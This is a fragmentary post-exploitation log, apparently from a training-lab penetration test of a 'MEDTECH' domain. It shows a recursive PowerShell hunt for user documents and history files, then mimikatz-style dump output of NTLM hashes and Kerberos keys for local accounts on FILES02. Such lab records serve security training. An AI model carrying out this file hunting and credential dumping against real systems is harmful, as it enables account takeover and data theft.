...
Get-ChildItem -Path C:\Users -Include *.txt,*.doc,*.docx,*.xls,*.xlsx,*.pdf -Recurse -ErrorAction SilentlyContinue -Force
	...
	-a----        10/18/2022   7:32 AM            468 ConsoleHost_history.txt
	    ...
	    Directory: C:\Users\administrator.MEDTECH\Application Data\Microsoft\Windows\PowerShell\PSReadLine
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----        10/18/2022   7:32 AM            468 ConsoleHost_history.txt
	...
	-a----        10/28/2022   3:22 AM           1672 ConsoleHost_history.txt
	    ...
	    Directory: C:\Users\wario\Application Data\Microsoft\Windows\PowerShell\PSReadLine
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----        10/28/2022   3:22 AM           1672 ConsoleHost_history.txt
...
Local SID : S-1-5-21-617574027-3497765368-2664405491

SAMKey : ca7342ed3359bb8007ca68676054f5ed
...
* Primary:NTLM-Strong-NTOWF *
    Random Value : 2d8842b48a713ca4908107a4f11eba0a

* Primary:Kerberos-Newer-Keys *
    Default Salt : FILES02.MEDTECH.COMAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 26e84079af17f8c69b7c665bfb8fbe2287e73f20709dd58d3142bb70adf0abaa
      aes128_hmac       (4096) : ec6dd3476a626ee75fadadc2f0f8bd08
      des_cbc_md5       (4096) : 0e192c9d406210b5
    OldCredentials
      aes256_hmac       (4096) : 2ecfb8cd1fee9f9914b754f897b55b07c9eda2a2ac88d221f113a306fc878a6e
      aes128_hmac       (4096) : d5aee3aa8e791333258d3d68f93097b9
      des_cbc_md5       (4096) : 43765de364a10d1c
    OlderCredentials
      aes256_hmac       (4096) : 8b857cbafc38593d6a57f203b6746e3c24c2a58230e88a7cc04236eb7a6aa684
      aes128_hmac       (4096) : 55892c7bc24cbad91f61398038226df5
      des_cbc_md5       (4096) : 07c87a6b3e8fb68f
...
* Primary:Kerberos *
    Default Salt : FILES02.MEDTECH.COMAdministrator
    Credentials
      des_cbc_md5       : 0e192c9d406210b5
    OldCredentials
      des_cbc_md5       : 43765de364a10d1c
...
User : WDAGUtilityAccount
  Hash NTLM: 0c6ce171c9cc3afb29ca0ccc335e49bb

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 536e936be7029f197379c0b8e9be2e87

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d341e2900d8a3e7bbc702218564791c78725c5203bbebc941bca714fce398798
      aes128_hmac       (4096) : 3cbaf806db222b88a478e1a037ae928a
      des_cbc_md5       (4096) : c7f82f3dda9d9ea1
